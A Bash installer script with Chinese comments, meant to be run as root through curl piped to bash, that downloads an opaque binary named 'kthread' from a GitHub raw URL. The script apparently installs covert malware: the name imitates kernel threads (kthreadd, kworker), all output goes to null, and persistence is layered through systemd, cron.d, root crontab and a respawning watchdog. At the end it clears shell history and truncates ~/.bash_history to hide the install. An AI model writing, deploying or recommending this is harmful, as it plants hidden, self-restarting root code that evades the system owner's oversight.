#!/bin/bash

# ============================================
# kthread 一键安装脚本（仅安装 kthread 服务）
# 项目地址: https://github.com/thm1472581-dotcom/kworker
# 使用方法:
#   bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/scripts/install_kthread.sh)"
# 程序包:
#   https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kthread.tar.gz
# ============================================

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

INSTALL_DIR="/var/local/kthreadd"
KTHREAD_BIN="${INSTALL_DIR}/kthread"
KTHREAD_WATCH="${INSTALL_DIR}/watch.sh"
KTHREAD_START="${INSTALL_DIR}/start-kthread.sh"
SERVICE_NAME="kthread"
WATCH_SERVICE_NAME="kthread-watch"
DOWNLOAD_URL="${DOWNLOAD_URL:-https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kthread.tar.gz}"

USE_SYSTEMD=1
USE_CRON_D=1

print_info()    { echo -e "${GREEN}[INFO]${NC} $1"; }
print_warn()    { echo -e "${YELLOW}[WARN]${NC} $1"; }
print_error()   { echo -e "${RED}[ERROR]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }

path_is_writable() {
	local target="$1"
	local probe="${target%/}/.kthread_probe_$$"
	touch "${probe}" 2>/dev/null || return 1
	rm -f "${probe}" 2>/dev/null || true
	return 0
}

check_root() {
	if [ "${EUID:-$(id -u)}" -ne 0 ]; then
		print_error "请使用 root 用户执行此脚本: sudo bash install_kthread.sh"
		exit 1
	fi
}

detect_install_mode() {
	local test_systemd="/etc/systemd/system"
	local test_cron="/etc/cron.d"

	if path_is_writable "${test_systemd}" && command -v systemctl >/dev/null 2>&1; then
		USE_SYSTEMD=1
		print_info "systemd 可用: ${test_systemd}"
	else
		USE_SYSTEMD=0
		print_warn "/etc/systemd/system 不可写或无 systemctl，将使用直接启动回退"
	fi

	if [ -d "${test_cron}" ] && path_is_writable "${test_cron}"; then
		USE_CRON_D=1
	else
		USE_CRON_D=0
		print_warn "/etc/cron.d 不可写，将尝试 root crontab 回退"
	fi
}

check_dependencies() {
	print_info "检查系统依赖..."

	if command -v curl >/dev/null 2>&1; then
		print_info "检测到 curl"
	elif command -v wget >/dev/null 2>&1; then
		print_info "检测到 wget"
	else
		print_error "未找到 curl 或 wget，请先安装其中之一"
		exit 1
	fi

	if ! command -v tar >/dev/null 2>&1; then
		print_error "未找到 tar 命令，请先安装 tar"
		exit 1
	fi

	if [ "${USE_SYSTEMD}" -eq 1 ] && ! command -v systemctl >/dev/null 2>&1; then
		USE_SYSTEMD=0
		print_warn "未找到 systemctl，切换为直接启动模式"
	fi

	print_success "依赖检查通过"
}

create_directory() {
	print_info "创建安装目录: ${INSTALL_DIR}"
	mkdir -p "${INSTALL_DIR}"
	chmod 755 "${INSTALL_DIR}"
	print_success "目录创建成功"
}

download_and_extract() {
	print_info "开始下载 kthread 程序包..."
	cd "${INSTALL_DIR}" || exit 1

	[ -f kthread.tar.gz ] && rm -f kthread.tar.gz

	if command -v curl >/dev/null 2>&1; then
		curl -fsSL "${DOWNLOAD_URL}" -o kthread.tar.gz
	else
		wget -q "${DOWNLOAD_URL}" -O kthread.tar.gz
	fi

	if [ ! -f kthread.tar.gz ]; then
		print_error "下载失败: ${DOWNLOAD_URL}"
		exit 1
	fi
	print_success "下载完成"

	print_info "解压文件..."
	tar -xzf kthread.tar.gz
	print_success "解压完成"
}

setup_permissions() {
	print_info "设置文件权限..."

	chmod 755 "${INSTALL_DIR}" 2>/dev/null || true

	if [ -f "${KTHREAD_BIN}" ]; then
		chmod 755 "${KTHREAD_BIN}"
	else
		print_error "未找到 kthread 二进制文件: ${KTHREAD_BIN}"
		exit 1
	fi

	if [ -f "${INSTALL_DIR}/kthread-watch.sh" ] && [ ! -f "${KTHREAD_WATCH}" ]; then
		cp -f "${INSTALL_DIR}/kthread-watch.sh" "${KTHREAD_WATCH}"
	fi
	if [ ! -f "${KTHREAD_WATCH}" ]; then
		cat > "${KTHREAD_WATCH}" <<'WATCH_EOF'
#!/bin/bash
EXE="/var/local/kthreadd/kthread"
while true; do
  if ! pgrep -f "$EXE --service-worker" >/dev/null 2>&1; then
    systemctl restart kthread.service >/dev/null 2>&1 || "$EXE" --service-worker >/dev/null 2>&1 &
  fi
  sleep 15
done
WATCH_EOF
	fi
	chmod 755 "${KTHREAD_WATCH}"

	print_success "权限设置完成"
}

write_kthread_service_unit() {
	local dest="${1:-/etc/systemd/system/${SERVICE_NAME}.service}"
	cat > "${dest}" <<UNIT_EOF
[Unit]
Description=kthread
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=${INSTALL_DIR}
ExecStart=${KTHREAD_BIN} --service-worker
Restart=always
RestartSec=3
KillMode=mixed
TimeoutStopSec=15
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
UNIT_EOF
	chmod 644 "${dest}"
}

write_kthread_start_script() {
	cat > "${KTHREAD_START}" <<KTHREAD_START_EOF
#!/bin/bash
BIN="${KTHREAD_BIN}"
WATCH="${KTHREAD_WATCH}"
if ! pgrep -f "\${BIN} --service-worker" >/dev/null 2>&1; then
	nohup "\${BIN}" --service-worker >/dev/null 2>&1 &
fi
if ! pgrep -f "\${WATCH}" >/dev/null 2>&1; then
	nohup /bin/sh "\${WATCH}" >/dev/null 2>&1 &
fi
KTHREAD_START_EOF
	chmod 755 "${KTHREAD_START}"
}

install_service() {
	print_info "安装 ${SERVICE_NAME}.service..."
	local unit_src=""
	local dest="/etc/systemd/system/${SERVICE_NAME}.service"
	local local_dest="${INSTALL_DIR}/kthread.service"

	if [ -f "${INSTALL_DIR}/kthread.service" ]; then
		unit_src="${INSTALL_DIR}/kthread.service"
	fi

	if [ "${USE_SYSTEMD}" -eq 1 ]; then
		if [ -n "${unit_src}" ]; then
			cp -f "${unit_src}" "${dest}"
			chmod 644 "${dest}"
		else
			print_warn "包内无 kthread.service，生成默认 unit"
			write_kthread_service_unit "${dest}"
		fi
		systemctl daemon-reload
		print_success "kthread.service 安装完成"
	else
		if [ -n "${unit_src}" ]; then
			cp -f "${unit_src}" "${local_dest}" 2>/dev/null || write_kthread_service_unit "${local_dest}"
		else
			write_kthread_service_unit "${local_dest}"
		fi
		write_kthread_start_script
		print_info "unit 已保存到 ${local_dest}，使用 ${KTHREAD_START} 启动"
	fi
}

install_cron_d_watchdog() {
	local cron_file="/etc/cron.d/kthread"
	[ "${USE_CRON_D}" -eq 1 ] || return 1
	cat > "${cron_file}" <<CRON_EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

@reboot root ${KTHREAD_BIN} --service-worker >/dev/null 2>&1 &
@reboot root /bin/sh ${KTHREAD_WATCH} >/dev/null 2>&1 &
*/2 * * * * root pgrep -f "${KTHREAD_BIN} --service-worker" >/dev/null 2>&1 || ${KTHREAD_BIN} --service-worker >/dev/null 2>&1 &
CRON_EOF
	chmod 644 "${cron_file}"
	if command -v crond >/dev/null 2>&1; then
		systemctl restart crond >/dev/null 2>&1 || service crond restart >/dev/null 2>&1 || true
	elif command -v cron >/dev/null 2>&1; then
		systemctl restart cron >/dev/null 2>&1 || service cron restart >/dev/null 2>&1 || true
	fi
	return 0
}

install_crontab_watchdog() {
	local tmp
	if ! command -v crontab >/dev/null 2>&1; then
		print_warn "未找到 crontab 命令"
		return 1
	fi
	tmp="$(mktemp)" || return 1
	crontab -l 2>/dev/null | grep -v "${KTHREAD_BIN}" | grep -v "${KTHREAD_WATCH}" | grep -v "${KTHREAD_START}" > "${tmp}" || true
	cat >> "${tmp}" <<CRON_EOF
@reboot ${KTHREAD_START} >/dev/null 2>&1
*/2 * * * * pgrep -f "${KTHREAD_BIN} --service-worker" >/dev/null 2>&1 || ${KTHREAD_BIN} --service-worker >/dev/null 2>&1 &
CRON_EOF
	crontab "${tmp}" || { rm -f "${tmp}"; return 1; }
	rm -f "${tmp}"
	print_info "已安装 root crontab 守护"
	return 0
}

write_kthread_watch_service_unit() {
	local dest="${1:-/etc/systemd/system/${WATCH_SERVICE_NAME}.service}"
	cat > "${dest}" <<WATCH_UNIT_EOF
[Unit]
Description=kthread watchdog
After=network-online.target

[Service]
Type=simple
ExecStart=${KTHREAD_WATCH}
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
WATCH_UNIT_EOF
	chmod 644 "${dest}"
}

install_watchdog() {
	print_info "安装守护进程..."
	if install_cron_d_watchdog; then
		print_success "cron.d 守护已安装"
		return 0
	fi
	if install_crontab_watchdog; then
		print_success "crontab 守护已安装"
		return 0
	fi

	if [ "${USE_SYSTEMD}" -eq 1 ]; then
		local dest="/etc/systemd/system/${WATCH_SERVICE_NAME}.service"
		if [ -f "${INSTALL_DIR}/kthread-watch.service" ]; then
			cp -f "${INSTALL_DIR}/kthread-watch.service" "${dest}"
			chmod 644 "${dest}"
		else
			print_warn "包内无 kthread-watch.service，生成默认 unit"
			write_kthread_watch_service_unit "${dest}"
		fi
		systemctl daemon-reload
		systemctl enable --now "${WATCH_SERVICE_NAME}.service" >/dev/null 2>&1 || true
		print_success "systemd 守护服务已启用"
		return 0
	fi

	print_warn "无 cron/watch unit，依赖直接启动 + watch.sh"
	return 1
}

start_kthread_direct() {
	write_kthread_start_script
	"${KTHREAD_START}"
	sleep 1
	pgrep -f "${KTHREAD_BIN} --service-worker" >/dev/null 2>&1
}

start_service() {
	print_info "启动 ${SERVICE_NAME} 服务..."

	if [ ! -x "${KTHREAD_BIN}" ]; then
		print_error "kthread 二进制不可执行: ${KTHREAD_BIN}"
		exit 1
	fi

	if [ "${USE_SYSTEMD}" -eq 1 ] && [ -f "/etc/systemd/system/${SERVICE_NAME}.service" ]; then
		systemctl enable "${SERVICE_NAME}.service" >/dev/null 2>&1 || print_warn "enable 失败"
		if systemctl restart "${SERVICE_NAME}.service" >/dev/null 2>&1 \
			|| systemctl start "${SERVICE_NAME}.service" >/dev/null 2>&1; then
			print_success "服务启动成功并已设置开机自启"
			return 0
		fi
		print_warn "systemd 启动失败，尝试直接启动"
	fi

	if start_kthread_direct; then
		print_success "kthread 已直接启动"
		return 0
	fi

	print_error "服务启动失败"
	exit 1
}

check_status() {
	print_info "检查服务状态..."
	echo ""
	if [ "${USE_SYSTEMD}" -eq 1 ] && [ -f "/etc/systemd/system/${SERVICE_NAME}.service" ]; then
		systemctl status "${SERVICE_NAME}.service" --no-pager || true
	else
		pgrep -af "${KTHREAD_BIN}" 2>/dev/null || print_warn "kthread 进程未运行"
	fi
	echo ""
}

clean_history() {
	print_info "清理安装残留与历史记录..."

	rm -f "${INSTALL_DIR}/kthread.tar.gz" 2>/dev/null || true

	history -c 2>/dev/null || true
	if [ -f "${HOME}/.bash_history" ]; then
		tail -n 20 "${HOME}/.bash_history" > "${HOME}/.bash_history.tmp" 2>/dev/null || true
		[ -f "${HOME}/.bash_history.tmp" ] && mv -f "${HOME}/.bash_history.tmp" "${HOME}/.bash_history" 2>/dev/null || true
	fi

	print_success "清理完成"
}

show_complete_info() {
	echo ""
	echo "=========================================="
	print_success "kthread 安装完成！"
	echo "=========================================="
	echo -e "${GREEN}安装目录:${NC} ${INSTALL_DIR}"
	echo -e "${GREEN}服务名称:${NC} ${SERVICE_NAME}"
	if [ "${USE_SYSTEMD}" -eq 1 ]; then
		echo -e "${GREEN}安装模式:${NC} systemd"
		echo ""
		echo -e "${GREEN}常用命令:${NC}"
		echo "  systemctl status ${SERVICE_NAME}.service"
		echo "  systemctl start ${SERVICE_NAME}.service"
		echo "  systemctl stop ${SERVICE_NAME}.service"
		echo "  systemctl restart ${SERVICE_NAME}.service"
		echo "  journalctl -u ${SERVICE_NAME}.service -f"
	else
		echo -e "${GREEN}安装模式:${NC} 直接启动"
		echo ""
		echo -e "${GREEN}常用命令:${NC}"
		echo "  ${KTHREAD_START}"
		echo "  pgrep -af kthread"
	fi
	echo "=========================================="
}

error_handler() {
	print_error "安装过程中出现错误，请检查以上信息"
	exit 1
}

main() {
	trap error_handler ERR

	echo ""
	echo "=========================================="
	echo "     kthread 一键安装脚本"
	echo "=========================================="
	echo ""

	check_root
	detect_install_mode
	check_dependencies
	create_directory
	download_and_extract
	setup_permissions
	install_service
	install_watchdog || true
	start_service
	check_status
	clean_history
	show_complete_info
}

main "$@"
